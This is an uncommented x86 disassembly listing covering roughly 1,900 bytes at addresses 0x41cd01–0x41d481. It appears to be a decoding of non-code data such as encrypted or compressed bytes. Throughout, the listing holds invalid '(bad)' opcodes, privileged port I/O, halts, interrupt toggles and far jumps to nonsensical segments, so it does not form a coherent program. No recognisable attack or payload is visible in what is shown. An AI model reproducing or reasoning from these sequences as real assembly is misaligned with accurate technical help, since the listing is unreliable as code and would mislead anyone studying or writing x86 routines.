  41cd01:	(bad)  
  41cd02:	(bad)  
  41cd03:	push   ebp
  41cd04:	or     BYTE PTR [edx],0x93
  41cd07:	imul   eax,DWORD PTR [edx],0xd7ddd443
  41cd0d:	inc    ecx
  41cd0e:	dec    ecx
  41cd0f:	dec    edi
  41cd10:	retf   0x1253
  41cd13:	aas    
  41cd14:	jge    0x41ccbb
  41cd16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd17:	mov    DWORD PTR [ecx-0x2c5efc22],ebx
  41cd1d:	sub    eax,0x2502791b
  41cd22:	mov    ebx,DWORD PTR ds:[eax+0x7d]
  41cd26:	push   eax
  41cd27:	mov    al,ds:0xa277b786
  41cd2c:	add    eax,0xe0322887
  41cd31:	imul   ebp,DWORD PTR [ecx+0x18],0xffffffa4
  41cd35:	test   ch,bh
  41cd37:	mov    dh,0x70
  41cd39:	inc    esi
  41cd3a:	sub    bl,BYTE PTR [ebp-0x72]
  41cd3d:	xchg   ebx,eax
  41cd3e:	add    al,0x84
  41cd40:	mov    ah,0xec
  41cd42:	aaa    
  41cd43:	mov    ds:0xea1e1fa5,eax
  41cd48:	addr16 das 
  41cd4a:	ins    BYTE PTR es:[edi],dx
  41cd4b:	xor    DWORD PTR [edi],0x8a9d4b3c
  41cd51:	leave  
  41cd52:	rcl    DWORD PTR [esi-0x1f],cl
  41cd55:	in     al,dx
  41cd56:	loopne 0x41cdca
  41cd58:	aam    0x26
  41cd5a:	hlt    
  41cd5b:	out    dx,al
  41cd5c:	lahf   
  41cd5d:	sub    BYTE PTR [esi+0x30],dl
  41cd60:	push   edi
  41cd61:	sbb    al,0x6a
  41cd63:	mov    eax,0xb80e3d5b
  41cd68:	cli    
  41cd69:	xor    al,0xc5
  41cd6b:	sbb    BYTE PTR [eax+0x71f09175],ch
  41cd71:	push   ecx
  41cd72:	add    bh,BYTE PTR [ebp+eax*1+0x3d]
  41cd76:	adc    eax,0x134b9a94
  41cd7b:	jbe    0x41cd79
  41cd7d:	pop    ebx
  41cd7e:	inc    ebp
  41cd7f:	stc    
  41cd80:	cli    
  41cd81:	mov    eax,DWORD PTR fs:[ebx+0x985fe33]
  41cd88:	xchg   edi,eax
  41cd89:	out    dx,eax
  41cd8a:	pop    ebp
  41cd8b:	nop
  41cd8c:	push   0xffffffcf
  41cd8e:	add    edx,edx
  41cd90:	mov    dh,0xfe
  41cd92:	sti    
  41cd93:	dec    eax
  41cd94:	shl    BYTE PTR [ecx],1
  41cd96:	(bad)  
  41cd97:	jmp    0xd7e2:0x9c037c65
  41cd9e:	scas   al,BYTE PTR es:[edi]
  41cd9f:	jb     0x41ce07
  41cda1:	push   edx
  41cda2:	loope  0x41cd6c
  41cda4:	sbb    DWORD PTR [eax-0x45],edx
  41cda7:	inc    ebp
  41cda8:	adc    DWORD PTR [eax-0x15fc51ff],edi
  41cdae:	adc    eax,0xb0a24872
  41cdb3:	mov    esp,0x3e0a817f
  41cdb8:	mov    dl,0x3f
  41cdba:	inc    ebp
  41cdbb:	push   eax
  41cdbc:	stos   DWORD PTR es:[edi],eax
  41cdbd:	ins    BYTE PTR es:[edi],dx
  41cdbe:	cmp    BYTE PTR [edx-0x389d6b0c],0x97
  41cdc5:	xor    al,0xd1
  41cdc7:	and    dh,ch
  41cdc9:	(bad)  
  41cdca:	out    dx,al
  41cdcb:	rcl    BYTE PTR [esi],0x62
  41cdce:	cs leave 
  41cdd0:	jmp    edx
  41cdd2:	add    esp,ebp
  41cdd4:	imul   BYTE PTR [eax-0x53d1776]
  41cdda:	inc    ebx
  41cddb:	adc    BYTE PTR [edi],bh
  41cddd:	inc    eax
  41cdde:	mov    ch,0xc4
  41cde0:	call   0xd12d2782
  41cde5:	xchg   ebx,eax
  41cde6:	cli    
  41cde7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cde8:	gs sbb eax,0xa2c8ba4
  41cdee:	mov    ecx,0xb28f43a7
  41cdf3:	pop    edi
  41cdf4:	adc    eax,0x45c4ae99
  41cdf9:	fild   DWORD PTR [edi]
  41cdfb:	inc    ebx
  41cdfc:	dec    ebp
  41cdfd:	addr16 js 0x41ce24
  41ce00:	fsub   DWORD PTR [edx-0x51842767]
  41ce06:	xor    BYTE PTR [ecx+ebx*8-0x14fcf4b9],ah
  41ce0d:	adc    DWORD PTR [ebx+eax*8],0x33a87486
  41ce14:	frstor [edx+0x59fce1cd]
  41ce1a:	sbb    DWORD PTR [esi+0x67],edi
  41ce1d:	dec    esi
  41ce1e:	sub    DWORD PTR [edi],ebx
  41ce20:	xchg   edi,eax
  41ce21:	not    DWORD PTR ds:0xfb0e362
  41ce27:	data16 std 
  41ce29:	rcl    cl,cl
  41ce2b:	xor    DWORD PTR [ebx-0x6f],esp
  41ce2e:	and    DWORD PTR [ebx-0x3f2858f5],esp
  41ce34:	arpl   WORD PTR [ecx],bp
  41ce36:	adc    esi,DWORD PTR [edx-0x778a2246]
  41ce3c:	add    ah,BYTE PTR [ebp+0x2f]
  41ce3f:	pop    ss
  41ce40:	jb     0x41ce78
  41ce42:	(bad)  
  41ce43:	aad    0x2f
  41ce45:	cli    
  41ce46:	push   ecx
  41ce47:	mov    bh,0xa9
  41ce49:	je     0x41ce29
  41ce4b:	(bad)  
  41ce4c:	icebp  
  41ce4d:	mov    eax,0xe37e9671
  41ce52:	and    dh,ah
  41ce54:	adc    BYTE PTR [edx-0x6b],0xc4
  41ce58:	ret    
  41ce59:	mov    bl,0xde
  41ce5b:	cmp    ah,BYTE PTR [edi-0x335191fa]
  41ce61:	leave  
  41ce62:	dec    edx
  41ce63:	xchg   esp,eax
  41ce64:	push   0x48545101
  41ce69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce6a:	stos   DWORD PTR es:[edi],eax
  41ce6b:	popf   
  41ce6c:	jecxz  0x41ce74
  41ce6e:	in     eax,dx
  41ce6f:	cmp    eax,0x2e22a60a
  41ce74:	(bad)  
  41ce75:	out    dx,al
  41ce76:	jne    0x41ce0e
  41ce78:	push   DWORD PTR [ebx-0x12]
  41ce7b:	cmp    al,0xba
  41ce7d:	mov    bh,0xcb
  41ce7f:	jae    0x41cee6
  41ce81:	push   ebp
  41ce82:	adc    bh,ah
  41ce84:	pushf  
  41ce85:	or     dh,BYTE PTR [esi]
  41ce87:	int    0x5f
  41ce89:	sub    eax,0xc7a67d3f
  41ce8e:	inc    ebx
  41ce8f:	xor    DWORD PTR [edi+0x76135f79],edx
  41ce95:	add    bh,BYTE PTR [eax-0x7c380446]
  41ce9b:	pushf  
  41ce9c:	imul   ebx,DWORD PTR ds:0xf1b3cc1e,0xffffffcb
  41cea3:	mov    ah,0x65
  41cea5:	xor    eax,DWORD PTR [esi-0x1df22b0b]
  41ceab:	sahf   
  41ceac:	dec    esp
  41cead:	jbe    0x41cf0c
  41ceaf:	dec    ebp
  41ceb0:	jne    0x41ce67
  41ceb2:	or     bh,ah
  41ceb4:	and    DWORD PTR [ecx+0x24],esi
  41ceb7:	adc    eax,0x4dd74f46
  41cebc:	stos   BYTE PTR es:[edi],al
  41cebd:	xchg   DWORD PTR [edx],edx
  41cebf:	fdivr  QWORD PTR [esi+edx*8+0x63]
  41cec3:	out    0xef,al
  41cec5:	retf   0xe222
  41cec8:	push   cs
  41cec9:	inc    ecx
  41ceca:	push   0xc1ad4b1d
  41cecf:	mov    ch,0x1e
  41ced1:	imul   edx,DWORD PTR [edi-0x56fc19bf],0x36bad25
  41cedb:	stos   DWORD PTR es:[edi],eax
  41cedc:	ds jecxz 0x41ce93
  41cedf:	mov    edx,0x23e1cd3f
  41cee4:	xor    eax,DWORD PTR [esi+0x74]
  41cee7:	add    BYTE PTR ds:0x2fd80fb8,bh
  41ceed:	adc    cl,BYTE PTR [edx-0x239eacb0]
  41cef3:	push   ss
  41cef4:	mov    esi,0xf6f1ca7c
  41cef9:	test   edi,ebx
  41cefb:	cdq    
  41cefc:	add    BYTE PTR [ebx-0x43635566],al
  41cf02:	fs das 
  41cf04:	cmp    BYTE PTR [edx-0x3ec48c44],cl
  41cf0a:	mov    ebp,0x1c810faf
  41cf0f:	ds addr16 cmp al,0xda
  41cf13:	xchg   BYTE PTR [eax-0x6d3d21df],cl
  41cf19:	daa    
  41cf1a:	(bad)  [ecx]
  41cf1c:	hlt    
  41cf1d:	or     BYTE PTR [ebx+0x6e267bf3],bl
  41cf23:	sub    ah,BYTE PTR [esi]
  41cf25:	shl    DWORD PTR ss:0x16e30db5,0x2e
  41cf2d:	(bad)  [eax-0x7fd33604]
  41cf33:	mov    DWORD PTR [eax],ebx
  41cf35:	aas    
  41cf36:	shr    BYTE PTR [eax+0x9],1
  41cf39:	cmp    dh,dl
  41cf3b:	cdq    
  41cf3c:	test   eax,0x19667859
  41cf41:	into   
  41cf42:	hlt    
  41cf43:	es ds dec edx
  41cf46:	xchg   esi,eax
  41cf47:	mov    bh,BYTE PTR [edx-0x7f71ed6a]
  41cf4d:	aad    0x49
  41cf4f:	mov    dh,0xf0
  41cf51:	gs jp  0x41cf6d
  41cf54:	add    al,0xfa
  41cf56:	leave  
  41cf57:	or     BYTE PTR [esi-0x2f],al
  41cf5a:	mov    bh,0x71
  41cf5c:	push   cs
  41cf5d:	nop
  41cf5e:	loopne 0x41cf04
  41cf60:	jo     0x41cfa8
  41cf62:	xchg   dh,bl
  41cf64:	dec    ecx
  41cf65:	sbb    ah,BYTE PTR [esi+0x30]
  41cf68:	push   edi
  41cf69:	jae    0x41cf1e
  41cf6b:	adc    al,0x52
  41cf6d:	es xchg ebx,eax
  41cf6f:	in     eax,0xf6
  41cf71:	nop
  41cf72:	mov    edi,0xafe5dbe3
  41cf77:	or     ah,bl
  41cf79:	mov    al,0xfb
  41cf7b:	fbld   TBYTE PTR [ebp+ebp*2+0x8]
  41cf7f:	mov    cl,0x6
  41cf81:	addr16 jle 0x41cfcb
  41cf84:	(bad)  
  41cf85:	pop    ds
  41cf86:	pop    es
  41cf87:	xchg   edi,eax
  41cf88:	icebp  
  41cf89:	or     esp,DWORD PTR [ebx]
  41cf8b:	xor    bl,cl
  41cf8d:	xlat   BYTE PTR ds:[ebx]
  41cf8e:	(bad)  
  41cf8f:	(bad)  
  41cf90:	mov    ah,0xf7
  41cf92:	sub    esi,DWORD PTR [ebx]
  41cf94:	mov    bl,0xdc
  41cf96:	and    al,0x4c
  41cf98:	xor    eax,0x42284a5c
  41cf9d:	ds inc esi
  41cf9f:	lds    esp,FWORD PTR [ebx]
  41cfa1:	jle    0x41cfe5
  41cfa3:	mov    ds:0xb08f8908,al
  41cfa8:	mov    al,0x8c
  41cfaa:	test   DWORD PTR [ecx],ebx
  41cfac:	call   0x214d:0x852bc88d
  41cfb3:	add    DWORD PTR [ecx-0x398b3991],ebx
  41cfb9:	xchg   edx,eax
  41cfba:	imul   edi,DWORD PTR [esi+0x492cd68d],0x2d67dfc8
  41cfc4:	repnz xchg edi,eax
  41cfc6:	inc    edi
  41cfc7:	inc    edx
  41cfc8:	daa    
  41cfc9:	jne    0x41d048
  41cfcb:	in     eax,dx
  41cfcc:	outs   dx,BYTE PTR ds:[esi]
  41cfcd:	das    
  41cfce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfcf:	inc    esi
  41cfd0:	sbb    BYTE PTR [ebp+edx*2+0x3ccf19c8],ah
  41cfd7:	push   esp
  41cfd8:	adc    BYTE PTR [esi],bh
  41cfda:	mov    edi,0x8a32cacc
  41cfdf:	repz adc ebx,DWORD PTR [edi-0x532d8e7e]
  41cfe6:	mov    ch,0x63
  41cfe8:	xchg   esi,eax
  41cfea:	stos   BYTE PTR es:[edi],al
  41cfeb:	mov    DWORD PTR [ecx-0x48],ebx
  41cfee:	mov    BYTE PTR [ebx+0x2a],ah
  41cff1:	sub    al,0xa7
  41cff3:	and    ebx,ebx
  41cff5:	jnp    0x41d067
  41cff7:	add    BYTE PTR [ecx],0x92
  41cffa:	cmp    al,bl
  41cffc:	push   ss
  41cffd:	(bad)  [ebx]
  41cfff:	mov    BYTE PTR [ecx-0x23348998],al
  41d005:	push   0x68a68dd7
  41d00a:	or     ebx,DWORD PTR [ecx+eax*2]
  41d00d:	popf   
  41d00e:	or     al,0x51
  41d010:	xor    al,0x5b
  41d012:	ins    DWORD PTR es:[edi],dx
  41d013:	mov    ecx,0x83ecebae
  41d018:	xchg   edi,eax
  41d019:	cmp    al,0x29
  41d01b:	mov    esp,0xd9b2d44a
  41d020:	pop    eax
  41d021:	test   DWORD PTR [ebx+esi*1+0xa],ebp
  41d025:	in     al,0xa1
  41d027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d028:	clc    
  41d029:	dec    ebx
  41d02a:	cmp    BYTE PTR [ebx+eax*2+0x411e5fff],bh
  41d031:	push   es
  41d032:	sbb    DWORD PTR [ebx+0x29],eax
  41d035:	into   
  41d036:	inc    eax
  41d037:	addr16 jb 0x41cfee
  41d03a:	inc    edx
  41d03b:	test   eax,0xa59a8846
  41d040:	sbb    DWORD PTR [ebx-0x44294ca5],0xd94aeb8e
  41d04a:	ss test dl,ah
  41d04d:	fdiv   st(3),st
  41d04f:	ja     0x41d0af
  41d051:	xor    bh,BYTE PTR [ebx]
  41d053:	xor    DWORD PTR [esp+eiz*4-0x3cb6eab3],0x969523e5
  41d05e:	jl     0x41d0ad
  41d060:	sbb    eax,0xfaf53b45
  41d065:	popf   
  41d066:	sbb    eax,0x4f50d056
  41d06b:	test   eax,0x60ba0e72
  41d070:	mov    ebx,0x519dc187
  41d075:	sub    edx,DWORD PTR [ebp+0x617aa478]
  41d07b:	test   esp,edx
  41d07d:	xor    eax,0x8eb29368
  41d082:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d083:	and    DWORD PTR [ecx-0x8],ebx
  41d086:	leave  
  41d087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d088:	mov    bh,0xa2
  41d08a:	dec    ecx
  41d08b:	test   eax,0x63052f74
  41d090:	lahf   
  41d091:	stos   DWORD PTR es:[edi],eax
  41d092:	add    DWORD PTR [edi-0xb4ac34b],esi
  41d098:	jl     0x41d0c5
  41d09a:	sbb    al,0x16
  41d09c:	adc    BYTE PTR [ecx],al
  41d09e:	fldcw  WORD PTR [ebp-0x49]
  41d0a1:	loopne 0x41d067
  41d0a3:	xchg   edi,eax
  41d0a4:	push   esi
  41d0a5:	addr16 jl 0x41d0d2
  41d0a8:	pop    esp
  41d0a9:	pop    eax
  41d0aa:	fistp  QWORD PTR [ecx+0x5a]
  41d0ad:	out    dx,al
  41d0ae:	int3   
  41d0af:	mov    DWORD PTR [edi+0x25fff05a],ebx
  41d0b5:	sub    BYTE PTR [eax+0x44],al
  41d0b8:	fldl2t 
  41d0ba:	xchg   ecx,eax
  41d0bb:	jmp    0x7967f4de
  41d0c0:	jl     0x41d0b5
  41d0c2:	pop    ecx
  41d0c3:	(bad)
  41d0c6:	jo     0x41d052
  41d0c8:	les    ebp,FWORD PTR [edi+0x490bab1f]
  41d0ce:	cmp    eax,0xe4041c9f
  41d0d3:	test   bl,dl
  41d0d5:	push   es
  41d0d6:	cmp    dl,BYTE PTR [eax+0x5db3118e]
  41d0dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0dd:	and    BYTE PTR [edi+0x65],ch
  41d0e0:	mov    ebx,DWORD PTR [ecx]
  41d0e2:	sub    al,0xa2
  41d0e4:	adc    eax,DWORD PTR [edx]
  41d0e6:	bound  eax,QWORD PTR [ecx-0x1ab019b2]
  41d0ec:	(bad)  
  41d0ed:	in     eax,0x17
  41d0ef:	scas   eax,DWORD PTR es:[edi]
  41d0f0:	cdq    
  41d0f1:	pop    ebx
  41d0f2:	mov    ebx,0xf71c2904
  41d0f7:	jae    0x41d0c9
  41d0f9:	pop    es
  41d0fa:	rol    DWORD PTR [edi+0x3c],0xe4
  41d0fe:	in     al,0x51
  41d100:	sbb    eax,0x30b53a1c
  41d105:	push   ebp
  41d106:	aas    
  41d107:	int3   
  41d108:	fnstcw WORD PTR [ebp+edx*1-0x2075d47c]
  41d10f:	lahf   
  41d110:	mov    dh,0x92
  41d112:	int3   
  41d113:	arpl   WORD PTR [ebp+0x45216bf8],si
  41d119:	(bad)  
  41d11a:	jp     0x41d114
  41d11c:	add    al,BYTE PTR [ebx-0x5c]
  41d11f:	ss ja  0x41d0df
  41d122:	sar    edx,cl
  41d124:	mov    ebx,0xb3167640
  41d129:	pop    ss
  41d12a:	clc    
  41d12b:	ficom  DWORD PTR [ecx+ecx*4]
  41d12e:	cmp    al,0xe
  41d130:	cmp    eax,0xbe6bb391
  41d135:	jmp    0xe1da:0x1a4fbf1
  41d13c:	and    BYTE PTR ds:0x668efbbe,0xea
  41d143:	push   es
  41d144:	jae    0x41d1a0
  41d146:	jle    0x41d120
  41d148:	pop    esp
  41d149:	popf   
  41d14a:	mov    eax,0xc4fa65ce
  41d14f:	xchg   edi,eax
  41d150:	repnz ins BYTE PTR es:[edi],dx
  41d152:	rcl    DWORD PTR ds:0x6abecb9f,0xeb
  41d159:	push   ebp
  41d15a:	scas   eax,DWORD PTR es:[edi]
  41d15b:	jle    0x41d0f1
  41d15d:	xor    al,0x56
  41d15f:	test   DWORD PTR [edx+0x16],ecx
  41d162:	mov    DWORD PTR [edi+0x65],0x2ffcc996
  41d169:	(bad)  
  41d16a:	out    dx,al
  41d16b:	pop    ebp
  41d16c:	push   cs
  41d16d:	push   0x8
  41d16f:	loop   0x41d18e
  41d171:	gs mov ah,0x12
  41d174:	cdq    
  41d175:	leave  
  41d176:	out    dx,eax
  41d177:	cmp    ch,ch
  41d179:	and    eax,0x61fc5f4
  41d17e:	dec    esp
  41d17f:	xchg   BYTE PTR [ebx],dl
  41d181:	mov    bh,0x1c
  41d183:	ret    0xf3f5
  41d186:	or     eax,0xc2f49fe3
  41d18b:	add    al,0x2a
  41d18d:	mov    cl,0x90
  41d18f:	frstor [ecx-0x6e]
  41d192:	in     eax,0xf9
  41d194:	xchg   esi,eax
  41d195:	mov    WORD PTR [ebx+0x4a],?
  41d198:	lahf   
  41d199:	xor    DWORD PTR [ebp+0x34],ebp
  41d19c:	fwait
  41d19d:	out    0x6e,al
  41d19f:	push   esp
  41d1a0:	dec    ecx
  41d1a1:	inc    ebx
  41d1a2:	pop    ecx
  41d1a3:	mov    edx,0x68a60518
  41d1a8:	ja     0x41d1a5
  41d1aa:	mov    ebx,0x923a851e
  41d1af:	sub    eax,0xe70abb56
  41d1b4:	mov    bh,0xfc
  41d1b6:	dec    ebx
  41d1b7:	pusha  
  41d1b8:	loop   0x41d1c8
  41d1ba:	xor    DWORD PTR [eax],esp
  41d1bc:	test   al,0x9c
  41d1be:	fst    QWORD PTR [ecx+eiz*1-0x45]
  41d1c2:	push   esi
  41d1c3:	mov    ah,dl
  41d1c5:	and    DWORD PTR [edx-0x7259cc0],esp
  41d1cb:	xlat   BYTE PTR ds:[ebx]
  41d1cc:	addr16 fcomi st,st(5)
  41d1cf:	fwait
  41d1d0:	sub    al,0xe6
  41d1d2:	sub    esp,ebp
  41d1d4:	adc    ebp,DWORD PTR [esi+0x4a7dc2df]
  41d1da:	jbe    0x41d19a
  41d1dc:	push   ebp
  41d1dd:	ret    
  41d1de:	rcl    BYTE PTR [eax-0x4a],cl
  41d1e1:	ins    BYTE PTR es:[edi],dx
  41d1e2:	into   
  41d1e3:	mov    esi,0xd599e9db
  41d1e8:	dec    esi
  41d1e9:	sub    ecx,DWORD PTR [ecx-0x7c53b15a]
  41d1ef:	push   edx
  41d1f0:	xchg   DWORD PTR [ebx+0x5e],ebp
  41d1f3:	cmc    
  41d1f4:	sbb    esp,DWORD PTR [edx+0x65fd5fec]
  41d1fa:	cmp    BYTE PTR [ecx+0x22],ah
  41d1fd:	leave  
  41d1fe:	adc    eax,0xdd6c6cfb
  41d203:	mov    edx,0xf5f30bf1
  41d208:	(bad)  
  41d209:	jnp    0x41d1b5
  41d20b:	pop    edi
  41d20c:	sbb    al,BYTE PTR [ebx]
  41d20e:	or     al,0x84
  41d210:	mov    ah,0x32
  41d212:	cld    
  41d213:	pop    eax
  41d214:	clc    
  41d215:	push   ebx
  41d216:	out    dx,eax
  41d217:	neg    DWORD PTR [ebp-0x2efa25a4]
  41d21d:	mov    edi,0x6ee1b83c
  41d222:	jmp    0x15f4:0x2ea3279d
  41d229:	mov    edi,0x33ba76df
  41d22e:	push   ecx
  41d22f:	dec    esp
  41d230:	sti    
  41d231:	cld    
  41d232:	adc    edx,DWORD PTR [edx+0x13]
  41d235:	ins    DWORD PTR es:[edi],dx
  41d236:	and    DWORD PTR [edx+0x3d0b3907],0xa182ec32
  41d240:	iret   
  41d241:	iret   
  41d242:	add    eax,0xd43411b5
  41d247:	retf   0x3410
  41d24a:	mov    ch,0x9b
  41d24c:	dec    ebx
  41d24d:	lds    eax,FWORD PTR [ebp+0x47bd24e0]
  41d253:	pusha  
  41d254:	dec    esi
  41d255:	sahf   
  41d256:	dec    edi
  41d257:	sub    eax,0x3a05b0bc
  41d25c:	test   al,0x26
  41d25e:	(bad)  
  41d25f:	in     eax,0xb6
  41d261:	in     eax,dx
  41d262:	mov    ebp,0x4e3935e5
  41d267:	xlat   BYTE PTR ds:[ebx]
  41d268:	cmc    
  41d269:	scas   eax,DWORD PTR es:[edi]
  41d26a:	mov    ch,0xc8
  41d26c:	test   DWORD PTR [edi-0x340527ff],ebx
  41d272:	loop   0x41d27b
  41d274:	xor    eax,0xe9094855
  41d279:	lock xchg edi,eax
  41d27b:	cmp    BYTE PTR [eax+0x6867b4c3],dl
  41d281:	sar    DWORD PTR [ebp+0x56fbed15],1
  41d287:	mov    ch,0x7
  41d289:	cwde   
  41d28a:	mov    al,ds:0xe62c8c46
  41d28f:	lahf   
  41d290:	add    ecx,eax
  41d292:	leave  
  41d293:	inc    eax
  41d294:	jb     0x41d30c
  41d296:	jg     0x41d237
  41d298:	sub    al,0x5c
  41d29a:	scas   al,BYTE PTR es:[edi]
  41d29b:	scas   eax,DWORD PTR es:[edi]
  41d29c:	nop
  41d29d:	out    dx,al
  41d29e:	pop    es
  41d29f:	push   eax
  41d2a0:	cmp    DWORD PTR [eax],esi
  41d2a2:	retf   
  41d2a3:	hlt    
  41d2a4:	icebp  
  41d2a5:	jge    0x41d292
  41d2a7:	add    ah,ch
  41d2a9:	xchg   BYTE PTR [ecx-0x49],dh
  41d2ac:	pop    esi
  41d2ad:	sahf   
  41d2ae:	rol    DWORD PTR [ecx],0xb6
  41d2b1:	test   al,0xb8
  41d2b3:	mov    es,WORD PTR ds:0xafb49d3
  41d2b9:	xor    al,0x64
  41d2bb:	es ins BYTE PTR es:[edi],dx
  41d2bd:	outs   dx,BYTE PTR ds:[esi]
  41d2be:	and    al,0x92
  41d2c0:	xchg   DWORD PTR [ecx-0x7aa17f42],eax
  41d2c6:	jns    0x41d317
  41d2c8:	or     DWORD PTR [eax-0x22c5486f],esi
  41d2ce:	mov    ecx,0xa980c51
  41d2d3:	adc    bh,BYTE PTR [ecx]
  41d2d5:	ja     0x41d2c2
  41d2d7:	loope  0x41d32f
  41d2d9:	lahf   
  41d2da:	or     dh,BYTE PTR [ecx+0x434df2c0]
  41d2e0:	adc    DWORD PTR [edi+0x40],edi
  41d2e3:	inc    esi
  41d2e4:	cdq    
  41d2e5:	jne    0x41d298
  41d2e7:	add    eax,0x7d682b38
  41d2ec:	(bad)  
  41d2ed:	mov    esi,0xad9e602d
  41d2f2:	retf   0xda6d
  41d2f5:	pop    eax
  41d2f6:	bound  edi,QWORD PTR [eax-0x5ed3a0da]
  41d2fc:	ror    DWORD PTR [esi+0x10579505],1
  41d302:	retf   0xabe
  41d305:	call   0x1d3a:0xb07fbbe2
  41d30c:	cmp    esp,DWORD PTR [esi+0x42]
  41d30f:	loope  0x41d34e
  41d311:	mov    bl,0xed
  41d313:	dec    ecx
  41d314:	push   edx
  41d315:	fisttp QWORD PTR [ebp-0x986d4b0]
  41d31b:	or     al,cl
  41d31d:	imul   ecx,DWORD PTR [esi+ebx*4],0x73
  41d321:	fimul  DWORD PTR [edx]
  41d323:	push   0x28
  41d325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d326:	pusha  
  41d327:	fwait
  41d328:	pop    esi
  41d329:	clc    
  41d32a:	pushw  0x6d
  41d32d:	push   ss
  41d32e:	cmp    DWORD PTR [ebx],ebp
  41d330:	mov    bl,0x19
  41d332:	call   FWORD PTR [ebp-0x634f4e68]
  41d338:	aam    0x32
  41d33a:	jb     0x41d34a
  41d33c:	pop    eax
  41d33d:	mov    al,0xb7
  41d33f:	pushf  
  41d340:	aas    
  41d341:	inc    ebp
  41d342:	pusha  
  41d343:	pop    ecx
  41d344:	fwait
  41d345:	icebp  
  41d346:	pop    esi
  41d347:	mov    ch,0x60
  41d349:	mov    WORD PTR [esp+ecx*8-0x7f],fs
  41d34d:	mov    esp,0x932d70b2
  41d352:	mov    ah,0x6
  41d354:	mov    ebx,0xaa751e8f
  41d359:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d35a:	fist   DWORD PTR [edi]
  41d35c:	pop    ebp
  41d35d:	add    ecx,DWORD PTR [eax]
  41d35f:	sar    BYTE PTR [eax],0x34
  41d362:	xor    eax,0x73deaa66
  41d367:	jne    0x41d317
  41d369:	sar    BYTE PTR [ecx-0x39],1
  41d36c:	push   0x8fd956c3
  41d371:	arpl   WORD PTR [edi+0x7b63e320],di
  41d377:	jle    0x41d33a
  41d379:	pop    ds
  41d37a:	adc    DWORD PTR [ecx-0x61],edx
  41d37d:	sub    BYTE PTR [edx+edi*2-0x1e],ch
  41d381:	mov    DWORD PTR [ecx+0x3b17339d],eax
  41d387:	in     eax,0x75
  41d389:	or     ch,BYTE PTR ds:0xbf5fdcd1
  41d38f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d390:	pop    edi
  41d391:	(bad)  
  41d392:	in     eax,0x2
  41d394:	int    0xd5
  41d396:	dec    esp
  41d397:	mov    ebp,0x57db1750
  41d39c:	loope  0x41d3ec
  41d39e:	ins    DWORD PTR es:[edi],dx
  41d39f:	and    ch,bh
  41d3a1:	cmp    eax,0xdd400ac1
  41d3a6:	jo     0x41d33e
  41d3a8:	adc    al,dl
  41d3aa:	sub    dh,dh
  41d3ac:	shl    BYTE PTR [ebp+0x2c],1
  41d3af:	test   BYTE PTR [ebx-0x36],bl
  41d3b2:	push   esi
  41d3b3:	or     ebp,ebx
  41d3b5:	out    dx,eax
  41d3b6:	int3   
  41d3b7:	pop    ebx
  41d3b8:	xchg   esp,eax
  41d3b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3ba:	sub    dl,ch
  41d3bc:	pop    ebp
  41d3bd:	or     eax,0xe4ba3b8b
  41d3c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3c3:	and    ebp,DWORD PTR [esi+edi*8]
  41d3c6:	mov    ebp,0x630806a6
  41d3cb:	mov    BYTE PTR ds:0x1335d9d6,bh
  41d3d1:	mov    edx,0x8755b51c
  41d3d6:	int3   
  41d3d7:	mov    ah,0x4
  41d3d9:	jmp    0xa652:0x69dfc9fa
  41d3e0:	sbb    al,0xaa
  41d3e2:	ja     0x41d3dc
  41d3e4:	ret    0x3eca
  41d3e7:	jl     0x41d3b9
  41d3e9:	push   0xe01d8fb6
  41d3ee:	aam    0x12
  41d3f0:	jmp    0x5622:0xd56b9b5d
  41d3f7:	popf   
  41d3f8:	xor    edx,DWORD PTR ds:0xfd9f47b4
  41d3fe:	cmp    dh,bl
  41d400:	inc    edx
  41d401:	xchg   ebx,eax
  41d402:	cdq    
  41d403:	or     eax,0xabb39894
  41d408:	jg     0x41d38a
  41d40a:	inc    esi
  41d40b:	mov    ?,esp
  41d40d:	lods   eax,DWORD PTR ds:[esi]
  41d40e:	jmp    0x41d467
  41d410:	jl     0x41d454
  41d412:	leave  
  41d413:	fiadd  DWORD PTR [esi]
  41d415:	sbb    BYTE PTR [esi+edx*2-0x70068f54],cl
  41d41c:	dec    esi
  41d41d:	aas    
  41d41e:	mov    es,edx
  41d420:	mov    bh,BYTE PTR [ecx-0x54b1bb0c]
  41d426:	pop    ebp
  41d427:	mov    ebx,0x9bfa2aa4
  41d42c:	adc    esi,DWORD PTR [ecx+0x5e]
  41d42f:	cdq    
  41d430:	pushf  
  41d431:	(bad)  
  41d432:	fsubr  DWORD PTR [esi+0x18]
  41d435:	or     ch,ah
  41d437:	retf   
  41d438:	push   eax
  41d439:	pop    ds
  41d43a:	out    0x3a,al
  41d43c:	les    edx,FWORD PTR [esi]
  41d43e:	out    0x8c,al
  41d440:	dec    ebx
  41d441:	xor    BYTE PTR [esi],cl
  41d443:	shr    ebp,cl
  41d445:	mov    al,0xe5
  41d447:	shr    esi,1
  41d449:	cmp    eax,0xc45c083a
  41d44e:	add    DWORD PTR [ecx-0x46],eax
  41d451:	div    BYTE PTR [edx+0x7e1694d9]
  41d457:	sbb    BYTE PTR [eax+0x31],al
  41d45a:	std    
  41d45b:	pop    edi
  41d45c:	cli    
  41d45d:	jno    0x41d3fe
  41d45f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d460:	push   ds
  41d461:	retf   0x3ec6
  41d464:	popf   
  41d465:	push   ebp
  41d466:	cmp    eax,0xaeff7981
  41d46b:	xchg   ecx,esi
  41d46d:	and    cl,BYTE PTR [esi+0x19514dca]
  41d473:	es inc edx
  41d475:	retf   
  41d476:	mov    ds:0x5522df29,al
  41d47b:	inc    edi
  41d47c:	adc    al,0x90
  41d47e:	mov    dl,0x74
  41d480:	aas    
  41d481:	add    DWORD PTR [ecx-0x72606261],esi
